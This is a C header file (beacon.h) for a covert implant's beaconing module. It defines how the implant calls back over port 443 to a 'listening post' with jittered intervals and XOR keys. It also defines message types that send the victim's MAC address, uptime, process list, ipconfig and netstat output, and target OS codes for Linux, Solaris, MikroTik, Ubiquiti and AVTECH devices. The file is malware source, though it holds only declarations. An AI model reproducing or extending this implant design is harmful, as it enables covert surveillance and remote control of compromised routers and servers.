#ifndef __BEACON_H
#define __BEACON_H

#include "function_strings.h"
#include "compat.h"

#define BEACON_HEADER_VERSION	29

#define MAC_ADDR_LEN			6
#define MAC_ADDR_LEN_FORMATTED	18
#define MAX_SSL_PACKET_SIZE		4052
#define TOOL_ID					0x65ae82c7
#define TOOL_ID_XOR_KEY			3
#define XOR_KEY					5
#define DEFAULT_BEACON_PORT		443				// HTTPS
#define DEFAULT_BEACON_VARIANCE	3 * 0.01f		// 3%

//Flag defines
// OS
#define BH_UNDEFINED		0
#define	BH_WINDOWS			10	// No longer supported
#define BH_LINUX_X86		20
#define BH_LINUX_X86_64		21
#define BH_SOLARIS_SPARC	30	// No longer supported
#define BH_SOLARIS_X86		31
#define BH_MIKROTIK_MIPS	40	// MIPS (Big Endian)
#define BH_MIKROTIK_MIPSEL	41	// MIPS (Little Endian) - No longer supported
#define BH_MIKROTIK_X86		42
#define BH_MIKROTIK_PPC		43
#define BH_UBIQUITI_MIPS	50	// MIPS (Big Endian)
#define BH_ARM				60
#define BH_AVTECH_ARM		61

//Header types
#define MAC					1
#define UPTIME				2
#define PROCESS_LIST		3
#define IPCONFIG			4
#define NETSTAT_RN			5
#define NETSTAT_AN			6
#define NEXT_BEACON_TIME 	7

/*!
 * @struct BEACONINFO
 * @brief 
 * The BEACONINFO struct holds configuration information about an implant's
 * beacon
 *
 * @var ip - Contains the ip address to beacon back to
 * @var port - Contains the port number to beacon back on
 * @var dnsIP - IP address(es) of DNS server(s)
 * @var macAddr - Contains the host's primary MAC address
 * @var initDelay - Time to wait before initial beacon
 * @var interval - Time to wait in between beacons
 * @var percentVariance - variance to apply to interval
 */

typedef struct __attribute__ ((packed)) _BEACON_INFO {
	char *host;										// Domain name  or IP address of beacon server
	char *ip;										// Resolved IP address of beacon server
	int port;
	char dns[2][16];								// Array of up to two DNS server addresses
	unsigned char macAddr[MAC_ADDR_LEN];
	unsigned long initDelay;						// Initial beacon delay (seconds)
	int interval;									// Beacon interval (seconds)
	float percentVariance;							// Variance in beacon interval in percent (0-100);
} BEACONINFO;

typedef struct __attribute__ ((packed)) beacon_header {
	unsigned short version;
	unsigned short os;
} BEACON_HDR;

typedef struct __attribute__ ((packed)) add_header {
	unsigned short type;
	unsigned short length;
} ADD_HDR;

typedef struct __attribute__ ((packed)) ssl_hdr {
	unsigned char type;
	unsigned short version;
	unsigned short length;
} SSL_HDR;

/*!
 * @brief Beacon
 * 
 * Function to send the MAC address and system uptime of the host
 * computer back to the listening post
 *
 * @param param - void pointer to a BEACONINFO structure
 */
void *beacon(void *param);

/*!
 * @brief BeaconStart
 * 
 * Takes the IP and port to beacon back to and the delay and interval
 * values for the beacon to callback on and populates a BEACONINFO 
 * structure.  Then spawns a seperate thread to perform the beaconing
 * function
 *
 * @param beaconIP - Charater string that holds the IP address to beacon 
 *					 back to
 * @param beaconPort - Port to connect back on
 * @param initialDelay - Intial time to wait before first beacon is sent
 * @param interval - The time to wait in between beacons.
 *
 * @return int - Returns -1 if the beacon thread failed to start or 0 if
 *				 the function succeeded.
 */

int beacon_start(BEACONINFO *beaconInfo);
int calc_jitter(int baseTime, float jitterPercent);
#endif							//__BEACON_H
